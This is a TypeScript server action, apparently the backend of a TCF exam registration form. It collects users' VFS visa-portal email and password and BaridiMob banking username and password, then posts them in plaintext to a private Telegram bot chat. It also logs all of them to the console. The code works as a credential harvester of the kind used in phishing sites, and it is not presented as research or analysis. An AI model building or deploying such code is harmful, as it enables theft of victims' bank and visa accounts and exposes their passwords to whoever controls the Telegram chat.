"use server"

export async function sendToTelegram(data: {
  tcfType: string
  examCenter: string
  selectedDate: string
  vfsEmail: string
  vfsPassword: string
  baridiMobUsername: string
  baridiMobPassword: string
}) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  console.log("[v0] Telegram Bot Token exists:", !!botToken)
  console.log("[v0] Telegram Chat ID exists:", !!chatId)
  console.log("[v0] Data received:", JSON.stringify(data, null, 2))

  if (!botToken || !chatId) {
    console.log("[v0] ERROR: Telegram credentials not configured")
    return { success: false, error: "Telegram not configured" }
  }

  const message = `
📋 *Nouvelle Inscription TCF*

*Type TCF:* ${data.tcfType}
*Centre d'examen:* ${data.examCenter}
*Date choisie:* ${data.selectedDate}

*Identifiants VFS:*
📧 Email: \`${data.vfsEmail}\`
🔑 Mot de passe: \`${data.vfsPassword}\`

*Identifiants BaridiMob:*
👤 Nom d'utilisateur: \`${data.baridiMobUsername}\`
🔑 Mot de passe: \`${data.baridiMobPassword}\`
  `.trim()

  console.log("[v0] Message to send:", message)

  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`
    console.log("[v0] Sending to Telegram API...")

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    const responseData = await response.json()
    console.log("[v0] Telegram API response:", JSON.stringify(responseData, null, 2))

    if (!response.ok) {
      console.log("[v0] ERROR: Telegram API returned error")
      return { success: false, error: JSON.stringify(responseData) }
    }

    console.log("[v0] SUCCESS: Message sent to Telegram")
    return { success: true }
  } catch (error) {
    console.log("[v0] ERROR: Failed to send to Telegram:", error)
    return { success: false, error: String(error) }
  }
}
